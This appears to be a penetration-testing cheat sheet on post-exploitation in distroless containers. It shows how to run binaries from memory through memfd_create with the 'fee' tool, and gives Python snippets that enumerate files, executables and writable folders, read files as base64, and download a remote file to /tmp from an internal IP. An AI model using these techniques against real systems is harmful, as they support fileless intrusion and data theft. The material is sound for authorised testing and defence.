# Distroless python memory execution

## Exec from memory

Using the project **[fee](https://github.com/nnsee/fileless-elf-exec)** it's possible to generate python code that can be used to execute a binary from memory using the **memfd_create syscall**.

```bash
fee /bin/ls > output.py
```

## Python utilities

### Get OS user
```python
import os
return os.getlogin()
```

### Get uname
```python
import platform
return platform.uname()
```

### List dir

```python
import json
from os import walk

def ls(dir_path):
    files = next(walk(dir_path), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})
```

### Find file

```python
def find_file(fname):
    import os
    found_files = []
    def get_files(path, fname):
        if not os.path.isdir(path) and fname in os.path.basename(path):
            found_files.append(path)
        
        if os.path.isdir(path):
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    try:
                        get_files(os.path.join(path, item), fname)
                    except Exception:
                        pass
    get_files("/", fname)
    return found_files
```

### Get executables

```python
import os
def find_executables(path):
    executables = []
    def _find_executables(path):
        if not os.path.isdir(path) and os.access(path, os.X_OK):
            executables.append(os.path.basename(path))
        
        if os.path.isdir(path):
            if not os.listdir(path):
                return
            else:
                try:
                    for item in os.listdir(path):
                        _find_executables(os.path.join(path, item))
                except PermissionError:
                    pass
    _find_executables(path)
    return executables
```

### Read file

```python
def read_fileb(path):
    with open(path, "rb") as f:
        return f.read()
```

### Read file in base64

```python
import base64
def read_fileb64(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode()
```

### Get permissions of file

```python
import os
def get_perms(path):
    return oct(os.stat(path).st_mode)[-3:]
```

### Http request

```python
from urllib import request
def http_req(url):
    return request.urlopen(url).read().decode()
```

### Download and write file

```python
def download(url):
    from urllib import request
    r = request.urlopen(url)
    fname = url.split("/")[-1]
    print(f"Writting in {fname}")
    with open(f"/tmp/{fname}", "wb") as f:
        f.write(r.read())
# download("http://172.17.0.3:8989/usr/lib/aarch64-linux-gnu/libpcre2-8.so.0")
```

### Get writable folders

```python
import os
def find_writable_dir(path):
    writables = []
    def find_writable(path):
        if not os.path.isdir(path):
            return
        if os.access(path, os.W_OK):
            writables.append(path)
        if not os.listdir(path):
            return
        else:
            try:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
            except:
                pass
    find_writable(path)
    return writables
```